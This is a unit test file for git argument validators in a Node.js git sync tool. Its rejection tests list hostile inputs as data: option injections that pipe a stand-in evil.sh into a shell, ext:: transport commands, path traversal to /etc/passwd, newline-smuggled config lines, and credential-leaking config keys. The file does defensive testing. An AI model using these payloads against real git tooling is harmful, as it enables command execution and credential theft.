// Copyright 2026 xz333221
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// gitArgs.js 单元测试。
//
// 这些校验挡的是「用户输入被 git 当成选项解析」——execFile 无 shell 拦不住
// git 自身的 --upload-pack / --output / ext:: 这类能执行命令或写文件的东西。
// 测试的重点是**攻击载荷必须被拒**、**正常用法必须放行**（尤其中文分支名,
// 用 ASCII 白名单会误伤,所以这里刻意用黑名单实现）。
import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  assertGitRef,
  assertGitHash,
  assertGitPath,
  assertGitRemoteUrl,
  assertGitConfigKey,
  assertGitConfigValue
} from './gitArgs.js'
import { HttpError } from './asyncRoute.js'

/** 断言该输入被拒,并返回抛出的 HttpError 状态码应 >= 400 */
function assertRejected(fn, input, label) {
  assert.throws(
    () => fn(input),
    (err) => {
      if (!(err instanceof HttpError)) return false
      if (!(err.statusCode >= 400)) return false
      return true
    },
    `${label}: 应拒绝输入 ${JSON.stringify(input)}`
  )
}

test('assertGitRef: 放行正常分支名', () => {
  for (const ok of ['main', 'feature/login', 'v1.0.0', 'release_2', '功能分支', 'fix/bug-123']) {
    assert.equal(assertGitRef(ok), ok.trim(), `应放行 ${ok}`)
  }
})

test('assertGitRef: 中文分支名必须放行(不能用 ASCII 白名单)', () => {
  assert.equal(assertGitRef('新功能'), '新功能')
  assert.equal(assertGitRef('修复/登录问题'), '修复/登录问题')
})

test('assertGitRef: 拒绝以 - 开头的参数注入载荷', () => {
  for (const bad of [
    '--upload-pack=curl evil.sh|sh',
    '--output=/etc/cron.d/x',
    '-u',
    '--exec=sh'
  ]) {
    assertRejected(assertGitRef, bad, 'assertGitRef')
  }
})

test('assertGitRef: 拒绝 git refname 非法字符、.. 与斜杠形态', () => {
  for (const bad of [
    'a b',            // 空格
    'HEAD~1',         // ~
    'a^',             // ^
    'a:b',            // :
    'a?b',            // ?
    'a*b',            // *
    'a[b',            // [
    'a\\b',           // 反斜杠
    'a..b',           // ..
    '/leading',
    'trailing/',
    'double//slash',
    '',
    '   '
  ]) {
    assertRejected(assertGitRef, bad, 'assertGitRef')
  }
})

test('assertGitHash: 放行 4~40 位十六进制', () => {
  assert.equal(assertGitHash('abc1234'), 'abc1234')
  assert.equal(assertGitHash('ABCDEF'), 'ABCDEF')
  assert.equal(assertGitHash('a'.repeat(40)), 'a'.repeat(40))
  assert.equal(assertGitHash('abcd'), 'abcd')
})

test('assertGitHash: 拒绝非十六进制与 rev 语法', () => {
  for (const bad of [
    'abc',              // 太短
    'g123456',          // 非十六进制
    'abc123^',          // rev 语法
    'HEAD',
    'main',
    '--output=/tmp/x',
    '',
    'a'.repeat(41)
  ]) {
    assertRejected(assertGitHash, bad, 'assertGitHash')
  }
})

test('assertGitPath: 放行仓库内相对路径', () => {
  for (const ok of ['src/foo.ts', 'a/b/c.js', 'README.md', '目录/文件.md']) {
    assert.equal(assertGitPath(ok), ok)
  }
})

test('assertGitPath: 拒绝绝对路径、盘符、UNC、.. 与选项形态', () => {
  for (const bad of [
    '../etc/passwd',
    'a/../../b',
    '/etc/passwd',
    'C:\\Windows\\system32',
    'C:/Windows',
    '\\\\server\\share',
    '--output=x',
    '',
    'a\x00b'
  ]) {
    assertRejected(assertGitPath, bad, 'assertGitPath')
  }
})

test('assertGitRemoteUrl: 放行常见远程地址', () => {
  for (const ok of [
    'https://github.com/xz333221/zen-gitsync.git',
    'git@github.com:xz333221/zen-gitsync.git',
    'ssh://git@github.com/xz333221/zen-gitsync.git',
    '/local/path/to/repo.git'
  ]) {
    assert.equal(assertGitRemoteUrl(ok), ok)
  }
})

test('assertGitRemoteUrl: 拒绝 ext:: 传输协议(会执行 shell 命令)', () => {
  for (const bad of [
    'ext::sh -c id',
    'EXT::sh -c id',
    'ext::sh -c "curl evil.sh|sh"',
    '--upload-pack=curl evil.sh|sh'
  ]) {
    assertRejected(assertGitRemoteUrl, bad, 'assertGitRemoteUrl')
  }
})

test('assertGitConfigKey: 放行前端实际用到的配置项', () => {
  for (const ok of [
    'user.name',
    'user.email',
    'core.autocrlf',
    'push.autoSetupRemote',
    'pull.rebase',
    'fetch.prune',
    'init.defaultBranch'
  ]) {
    assert.equal(assertGitConfigKey(ok), ok)
  }
})

test('assertGitConfigKey: 拒绝可泄露凭据或可执行命令的配置项', () => {
  for (const bad of [
    'http.https://github.com/.extraheader',  // 读走 PAT
    'core.editor',                            // 触发命令执行
    'core.pager',                             // 触发命令执行
    'alias.st',                               // git alias 走 shell
    'credential.helper',                      // 可设成 !command
    'core.sshCommand',
    '--get'
  ]) {
    assertRejected(assertGitConfigKey, bad, 'assertGitConfigKey')
  }
})

test('assertGitConfigKey: ZEN_GIT_CONFIG_ALLOWED_KEYS 可追加放行项', () => {
  const bak = process.env.ZEN_GIT_CONFIG_ALLOWED_KEYS
  try {
    process.env.ZEN_GIT_CONFIG_ALLOWED_KEYS = 'http.proxy, https.proxy'
    assert.equal(assertGitConfigKey('http.proxy'), 'http.proxy')
    assert.equal(assertGitConfigKey('https.proxy'), 'https.proxy')
    // 白名单仍然生效,没被环境变量顶掉
    assertRejected(assertGitConfigKey, 'core.pager', 'assertGitConfigKey')
  } finally {
    if (bak === undefined) delete process.env.ZEN_GIT_CONFIG_ALLOWED_KEYS
    else process.env.ZEN_GIT_CONFIG_ALLOWED_KEYS = bak
  }
})

test('assertGitConfigValue: 拒绝换行与方括号(否则能绕过 key 白名单)', () => {
  // 值里带换行会在 .gitconfig 里真的多出一行,等于凭空写入任意 key
  for (const bad of [
    'a\ncore.pager = sh -c id',
    'a\neditor = evil',
    'a\r\nb = c',
    '[core]\n\tpager = sh -c id',
    'a\x00b'
  ]) {
    assertRejected(assertGitConfigValue, bad, 'assertGitConfigValue')
  }
})

test('assertGitConfigValue: 放行正常取值', () => {
  assert.equal(assertGitConfigValue('  Zhang San  '), 'Zhang San')
  assert.equal(assertGitConfigValue('true'), 'true')
  assert.equal(assertGitConfigValue('main'), 'main')
  assert.equal(assertGitConfigValue('a@b.com'), 'a@b.com')
})
